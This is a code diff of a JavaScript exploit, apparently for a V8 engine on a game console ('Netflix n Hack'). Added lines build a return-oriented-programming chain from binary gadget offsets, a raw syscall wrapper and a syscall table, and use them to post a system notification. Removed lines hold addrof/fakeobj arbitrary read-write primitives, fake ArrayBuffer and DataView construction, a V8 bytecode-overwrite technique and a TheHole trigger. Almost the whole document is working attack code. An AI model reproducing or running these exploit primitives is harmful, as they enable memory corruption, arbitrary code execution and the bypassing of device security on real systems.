+        // Returns the value returned by the called function
+        function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+            
+            write64(add_rop_smash_code_store, 0xab0025n);
+            real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n; // We only leak lower 32bits, stack seems always be at upper 32bits 0x7
+                                                                    // Value is tagged, remove 1n
+                                                                    // Seems offseted by 2 bytes
+
+            let i = 0;
+
+            // Syscall Number (Syscall Wrapper)
+            rop_chain[i++] = eboot_base + g_pop_rax;
+            rop_chain[i++] = rax;
+
+            // Arguments
+            rop_chain[i++] = eboot_base + g_pop_rdi;
+            rop_chain[i++] = arg1;
+            rop_chain[i++] = eboot_base + g_pop_rsi;
+            rop_chain[i++] = arg2;
+            rop_chain[i++] = eboot_base + g_pop_rdx;
+            rop_chain[i++] = arg3;
+            rop_chain[i++] = eboot_base + g_pop_rcx;
+            rop_chain[i++] = arg4;
+            rop_chain[i++] = eboot_base + g_pop_r8;
+            rop_chain[i++] = arg5;
+            rop_chain[i++] = eboot_base + g_pop_r9;
+            rop_chain[i++] = arg6;
+
+            // Call Syscall Wrapper / Function
+            rop_chain[i++] = address;
+
+            // Store return value to return_value_addr
+            rop_chain[i++] = eboot_base + g_pop_rdi;
+            rop_chain[i++] = return_value_addr;
+            rop_chain[i++] = eboot_base + g_mov_qword_ptr_rdi_rax;
+
+            // Return to JS
+            rop_chain[i++] = eboot_base + g_pop_rax;
+            rop_chain[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
+            rop_chain[i++] = eboot_base + g_pop_rsp_pop_rbp;
+            rop_chain[i++] = real_rbp;
+            
+            write64(add_rop_smash_code_store, 0xab00260325n);
+            oob_arr[39] = add_fake_frame;
+            rop_smash(obj_arr[0]);          // Call ROP
+
+            //return BigInt(return_value_buffer[0]); // Return value returned by function
+            // Seems like this is not being executed
+        }
+
+        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
+        {
+            log("Enter syscall syscall_num : " + hex(syscall_num) );
+            log("Enter syscall arg1 : " + hex(arg1) );
+            log("Enter syscall arg2 : " + hex(arg2) );
+            log("Enter syscall arg3 : " + hex(arg3) );
+            
+            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
+            
+            return_value = return_value_buffer[0];
+            log("Returning from rop - value: " + hex(return_value));
+            return return_value;
+        }
+        
+        let SYSCALL = {
+            read: 0x3n,
+            write: 0x4n,
+            open: 0x5n,
+            close: 0x6n,
+            getuid: 0x18n,
+            getsockname: 0x20n,
+            accept: 0x1en,
+            socket: 0x61n,
+            connect: 0x62n,
+            bind: 0x68n,
+            setsockopt: 0x69n,
+            listen: 0x6an,
+            getsockopt: 0x76n,
+            sysctl: 0xcan,
+            netgetiflist: 0x7dn,
         };
-        let v3 = {
-            then(v7, v8) {
-                v8();
+
+        const O_RDONLY = 0n;
+        const O_WRONLY = 1n;
+        const O_RDWR = 2n;
+        const O_CREAT = 0x100n;
+        const O_TRUNC = 0x1000n;
+        const O_APPEND = 0x2000n;
+        const O_NONBLOCK = 0x4000n;
+
+        function write_string(addr, str) {
+            //const encoder = new TextEncoder();
+            //const bytes = encoder.encode(str);
+            
+            const add_of_str = addrof(str) + 12n;
+            
+            for (let i = 0; i < str.length; i++) {
+                byte = read8(add_of_str + BigInt(i));
+                write8_uncompressed(addr + BigInt(i), byte);
             }
-        };
-        Promise.any.call(f0, [v3]);
-        return v1[1];
-    },
-    make_hole_old() {
-        let a = [], b = [];
-        let s = '"'.repeat(0x800000);
-        a[20000] = s;
-
-        for (let i = 0; i < 10; i++) a[i] = s;
-        for (let i = 0; i < 10; i++) b[i] = a;
-
-        try {
-            JSON.stringify(b);
-        } catch (hole) {
-            return hole;
+            
+            write8_uncompressed(addr + BigInt(str.length), 0);
         }
-    
-        throw new Error('Could not trigger TheHole');
+
+        function alloc_string(str) {
+            //const encoder = new TextEncoder();
+            //const bytes = encoder.encode(str);
+            
+            const add_of_str = addrof(str) + 12n;;
+            const addr = malloc(str.length + 1); // Full 64bits Add
+            
+            for (let i = 0; i < str.length; i++) {
+                byte = read8(add_of_str + BigInt(i));
+                write8_uncompressed(addr + BigInt(i), byte);
+            }
+            
+            write8_uncompressed(addr + BigInt(str.length), 0);
+            
+            return addr;
+        }
+
+        function send_notification(text) {
+            const notify_buffer_size = 0xc30n;
+            const notify_buffer = malloc(Number(notify_buffer_size));
+            const icon_uri = "cxml://psnotification/tex_icon_system";
+                                
+            // Setup notification structure
+            write32_uncompressed(notify_buffer + 0x0n, 0);           // type
+            write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
+            write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
+            write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
+            
+            // Write message at offset 0x2D
+            write_string(notify_buffer + 0x2dn, text);
+            
+            // Write icon URI at offset 0x42D
+            write_string(notify_buffer + 0x42dn, icon_uri);
+            
+            // Open /dev/notification0
+            const dev_path = alloc_string("/dev/notification0");
+            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
+            
+            if (Number(fd) < 0) {
+                return;
+            }
+            
+            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
+            syscall(SYSCALL.close, fd);  
+        }
+
+        send_notification("Netflix-n-Hack ;)");
+
+    } catch (e) {
+        log("EXCEPTION: " + e.message);
+        log(e.stack);
     }
-}
-// #endregion
-// #region Arbitrary Primitives
-let lo_arr, lo_view;
-const arw = {
-    isolate: 0n,
-    base_addr: 0n,
-    fake_buf_addr: 0n,
-    fake_view_addr: 0n,
-    fake_buf_index: 0x10,
-    fake_view_index: 0x20,
-    fake_bytecode_index: 0x80,
-    fake_bytecode_size: 0x200n,
-    lo_arr_data_ptr_addr: 0n,
-    lo_arr_backing_store_addr: 0n,
-    init() {
-        let arr = new Uint8Array(0x40);
-        let arr_addr = rw.addrof(arr);
 
-        this.isolate = ptr.ih(rw.read(arr_addr + 0x28n));
-
-        if (this.isolate == 0n) {
-            throw new Error("Isolate is zero, exiting...");
-        }
-        
-        lo_arr = new Array(0x20001);
-        lo_view = new DataView(new ArrayBuffer(8));
-
-        lo_arr_addr = rw.addrof(lo_arr);
-        lo_view_addr = rw.addrof(lo_view);
-        lo_view_buf_addr = rw.addrof(lo_view.buffer);
-
-        this.lo_arr_backing_store_addr = rw.read32(lo_arr_addr + 0x8n, true);
-        this.lo_arr_data_ptr_addr = this.lo_arr_backing_store_addr + 0x8n;
-
-        rw.write(lo_view_addr + 0x18n, 0x20001n);
-        rw.write(lo_view_buf_addr + 0x14n, this.lo_arr_data_ptr_addr + this.isolate);
-
-        this.make_fake_buf();
-        this.make_fake_view();
-
-        logger.log("Achieved ARW !!");
-
-        let fake_view = this.fakeobj(this.fake_view_addr);
-
-        logger.log(`fake view length: ${fake_view.byteLength}`);
-
-        this.base_addr = this.view(this.isolate, 0n, -1n, false).getBigUint64(0x28, true) - 0x896EE8n;
-    },
-    addrof(obj) {
-        lo_arr[0] = obj;
-        return ptr.iuntag(BigInt(lo_view.getUint32(0, true)));
-    },
-    fakeobj(addr) {
-        lo_view.setUint32(0, Number(ptr.itag(ptr.il(addr))), true);
-        return lo_arr[0];
-    },
-    read(addr, untag = false) {
-        let value = arw.view(addr).getBigUint64(0, true);
-        return untag ? ptr.iuntag(value) : value;
-    },
-    write(addr, value, untag = false) {
-        arw.view(addr).setBigUint64(0, untag ? ptr.iuntag(value) : value, true);
-    },
-    read32(addr, untag = false) {
-        let value = BigInt(arw.view(addr).getUint32(0, true));
-        return untag ? ptr.iuntag(value) : value;
-    },
-    write32(addr, value, untag = false) {
-        arw.view(addr).setUint32(0, Number(untag ? ptr.iuntag(value) : value), true);
-    },
-    /** @return {DataView<ArrayBuffer>} */
-    view(addr, offset = 0n, size = -1n, isolated = true) {
-        lo_view.setBigUint64((4 * this.fake_buf_index) + 0x14, ptr.iuntag(isolated ? addr + this.isolate : addr), true);
-        lo_view.setBigUint64((4 * this.fake_view_index) + 0x10, BigInt(offset), true);
-        lo_view.setBigUint64((4 * this.fake_view_index) + 0x18, BigInt(size), true);
-        return this.fakeobj(this.fake_view_addr);
-    },
-    /** @return {DataView<ArrayBuffer>} */
-    fake_bytecode() {
-        return this.view(this.fake_bytecode_addr(), 0n, this.fake_bytecode_size);
-    },
-    fake_bytecode_addr() {
-        return this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_bytecode_index);
-    },
-    make_fake_buf() {
-        let buf = new ArrayBuffer(8);
-        let buf_addr = this.addrof(buf);
-        
-        let i = this.fake_buf_index;
-        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr)), true);
-        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x4n)), true);
-        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x8n)), true);
-        lo_view.setBigUint64(4 * i++, 0x1000n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true); // backing_store
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-        lo_view.setUint32(4 * i++, 2, true);
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++
-
-        this.fake_buf_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_buf_index);
-    },
-    make_fake_view() {
-        let buf = this.fakeobj(this.fake_buf_addr);
-
-        let view = new DataView(buf);
-        let view_addr = this.addrof(view);
-
-        let i = this.fake_view_index;
-        lo_view.setUint32(4 * i++, Number(rw.read32(view_addr)), true);
-        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x4n)), true);
-        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x8n)), true);
-        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0xCn)), true);
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, -1n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-        lo_view.setBigUint64(4 * i++, 0n, true);
-        i++;
-
-        this.fake_view_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_view_index);
-    }
-}
-// #endregion
-// #region ROP
-const rop = {
-    index: 0,
-    bytecode_age_index: 0x21,
-    bytecode_size_index: 0x4,
-    bytecode_frame_index: 0x14,
-    bytecode_start_index: 0x22,
-    bytecodes: Object.freeze({
-        Wide: 0,
-        ExtraWide: 1,
-        DebugBreakWide: 2,
-        DebugBreakExtraWide: 3,
-        DebugBreak0: 4,
-        DebugBreak1: 5,
-        DebugBreak2: 6,
-        DebugBreak3: 7,
-        DebugBreak4: 8,
-        DebugBreak5: 9,
-        DebugBreak6: 10,
-        LdaZero: 11,
-        LdaSmi: 12,
-        LdaUndefined: 13,
-        LdaNull: 14,
-        LdaTheHole: 15,
-        LdaTrue: 16,
-        LdaFalse: 17,
-        LdaConstant: 18,
-        LdaGlobal: 19,
-        LdaGlobalInsideTypeof: 20,
-        StaGlobal: 21,
-        PushContext: 22,
-        PopContext: 23,
-        LdaContextSlot: 24,
-        LdaImmutableContextSlot: 25,
-        LdaCurrentContextSlot: 26,
-        LdaImmutableCurrentContextSlot: 27,
-        StaContextSlot: 28,
-        StaCurrentContextSlot: 29,
-        LdaLookupSlot: 30,
-        LdaLookupContextSlot: 31,
-        LdaLookupGlobalSlot: 32,
-        LdaLookupSlotInsideTypeof: 33,
-        LdaLookupContextSlotInsideTypeof: 34,
-        LdaLookupGlobalSlotInsideTypeof: 35,
-        StaLookupSlot: 36,
-        Ldar: 37,
-        Star: 38,
-        Mov: 39,
-        LdaNamedProperty: 40,
-        LdaNamedPropertyNoFeedback: 41,
-        LdaNamedPropertyFromSuper: 42,
-        LdaKeyedProperty: 43,
-        LdaModuleVariable: 44,
-        StaModuleVariable: 45,
-        StaNamedProperty: 46,
-        StaNamedPropertyNoFeedback: 47,
-        StaNamedOwnProperty: 48,
-        StaKeyedProperty: 49,
-        StaInArrayLiteral: 50,
-        StaDataPropertyInLiteral: 51,
-        CollectTypeProfile: 52,
-        Add: 53,
-        Sub: 54,
-        Mul: 55,
-        Div: 56,
-        Mod: 57,
-        Exp: 58,
-        BitwiseOr: 59,
-        BitwiseXor: 60,
-        BitwiseAnd: 61,
-        ShiftLeft: 62,
-        ShiftRight: 63,
-        ShiftRightLogical: 64,
-        AddSmi: 65,
-        SubSmi: 66,
-        MulSmi: 67,
-        DivSmi: 68,
-        ModSmi: 69,
-        ExpSmi: 70,
-        BitwiseOrSmi: 71,
-        BitwiseXorSmi: 72,
-        BitwiseAndSmi: 73,
-        ShiftLeftSmi: 74,
-        ShiftRightSmi: 75,
-        ShiftRightLogicalSmi: 76,
-        Inc: 77,
-        Dec: 78,
-        Negate: 79,
-        BitwiseNot: 80,
-        ToBooleanLogicalNot: 81,
-        LogicalNot: 82,
-        TypeOf: 83,
-        DeletePropertyStrict: 84,
-        DeletePropertySloppy: 85,
-        GetSuperConstructor: 86,
-        CallAnyReceiver: 87,
-        CallProperty: 88,
-        CallProperty0: 89,
-        CallProperty1: 90,
-        CallProperty2: 91,
-        CallUndefinedReceiver: 92,
-        CallUndefinedReceiver0: 93,
-        CallUndefinedReceiver1: 94,
-        CallUndefinedReceiver2: 95,
-        CallNoFeedback: 96,
-        CallWithSpread: 97,
-        CallRuntime: 98,
-        CallRuntimeForPair: 99,
-        CallJSRuntime: 100,
-        InvokeIntrinsic: 101,
-        Construct: 102,
-        ConstructWithSpread: 103,
-        TestEqual: 104,
-        TestEqualStrict: 105,
-        TestLessThan: 106,
-        TestGreaterThan: 107,
-        TestLessThanOrEqual: 108,
-        TestGreaterThanOrEqual: 109,
-        TestReferenceEqual: 110,
-        TestInstanceOf: 111,
-        TestIn: 112,
-        TestUndetectable: 113,
-        TestNull: 114,
-        TestUndefined: 115,
-        TestTypeOf: 116,
-        ToName: 117,
-        ToNumber: 118,
-        ToNumeric: 119,
-        ToObject: 120,
-        ToString: 121,
-        CreateRegExpLiteral: 122,
-        CreateArrayLiteral: 123,
-        CreateArrayFromIterable: 124,
-        CreateEmptyArrayLiteral: 125,
-        CreateObjectLiteral: 126,
-        CreateEmptyObjectLiteral: 127,
-        CloneObject: 128,
-        GetTemplateObject: 129,
-        CreateClosure: 130,
-        CreateBlockContext: 131,
-        CreateCatchContext: 132,
-        CreateFunctionContext: 133,
-        CreateEvalContext: 134,
-        CreateWithContext: 135,
-        CreateMappedArguments: 136,
-        CreateUnmappedArguments: 137,
-        CreateRestParameter: 138,
-        JumpLoop: 139,
-        Jump: 140,
-        JumpConstant: 141,
-        JumpIfNullConstant: 142,
-        JumpIfNotNullConstant: 143,
-        JumpIfUndefinedConstant: 144,
-        JumpIfNotUndefinedConstant: 145,
-        JumpIfUndefinedOrNullConstant: 146,
-        JumpIfTrueConstant: 147,
-        JumpIfFalseConstant: 148,
-        JumpIfJSReceiverConstant: 149,
-        JumpIfToBooleanTrueConstant: 150,
-        JumpIfToBooleanFalseConstant: 151,
-        JumpIfToBooleanTrue: 152,
-        JumpIfToBooleanFalse: 153,
-        JumpIfTrue: 154,
-        JumpIfFalse: 155,
-        JumpIfNull: 156,
-        JumpIfNotNull: 157,
-        JumpIfUndefined: 158,
-        JumpIfNotUndefined: 159,
-        JumpIfUndefinedOrNull: 160,
-        JumpIfJSReceiver: 161,
-        SwitchOnSmiNoFeedback: 162,
-        ForInEnumerate: 163,
-        ForInPrepare: 164,
-        ForInContinue: 165,
-        ForInNext: 166,
-        ForInStep: 167,
-        SetPendingMessage: 168,
-        Throw: 169,
-        ReThrow: 170,
-        Return: 171,
-        ThrowReferenceErrorIfHole: 172,
-        ThrowSuperNotCalledIfHole: 173,
-        ThrowSuperAlreadyCalledIfNotHole: 174,
-        ThrowIfNotSuperConstructor: 175,
-        SwitchOnGeneratorState: 176,
-        SuspendGenerator: 177,
-        ResumeGenerator: 178,
-        GetIterator: 179,
-        Debugger: 180,
-        IncBlockCounter: 181,
-        Abort: 182
-    }),
-    init() {
-        this.pwn(0);
-
-        let pwn_addr = arw.addrof(this.pwn);
-        let shared_function_info = arw.read32(pwn_addr + 0xCn, true);
-        let function_data = arw.read32(shared_function_info + 0x4n, true);
-
-        for (var i = 0; i < this.bytecode_start_index; i++) {
-            let b = arw.view(function_data).getUint8(i);
-            arw.fake_bytecode().setUint8(i, b);
-        }
-
-        arw.fake_bytecode().setUint32(this.bytecode_frame_index, 0x200, true);
-
-        arw.write32(shared_function_info + 0x4n, ptr.itag(arw.fake_bytecode_addr()));
-
-        logger.log("Achieved ROP !!");
-    },
-    emit(inst) {
-        let value = 0;
-        switch(typeof inst) {
-            case "string":
-                if (inst in this.bytecodes) {
-                    value = this.bytecodes[inst];
-                }
-                break;
-            case "number":
-                value = inst;
-                break;
-        }
-
-        arw.fake_bytecode().setUint8(this.bytecode_start_index + this.index++, value);
-    },
-    reset() {
-        this.index = 0;
-    },
-    exec(x = 0) {
-        arw.fake_bytecode().setUint32(this.bytecode_size_index, this.index << 1, true);
-        arw.fake_bytecode().setUint8(this.bytecode_age_index, 0, true);
-
-        let value = this.pwn(x);
-        this.reset();
-        
-        return value;
-    },
-    pwn(x) {
-        return x + 1;
-    }
-}
-// #endregion
-
-function main() {
-    logger.init();
-    logger.log("=== Netflix n Hack ===");
-
-    rw.init();
-    arw.init();
-    rop.init();
-
-    rop.emit("Ldar");
-    rop.emit(0);
-    rop.emit("Return");
-    
-    let value = rop.exec();
-    logger.log(`Ldar 0, ret: ${value}`);
-
-    rop.emit("LdaUndefined");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaUndefined, ret: ${value}`);
-
-    rop.emit("LdaTrue");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaTrue, ret: ${value}`);
-
-    rop.emit("LdaZero");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaZero, ret: ${value}`);
-
-    //while (true) {}
-}
-
-ws.init("192.168.1.2", 1337, main);
-//main();
+})();
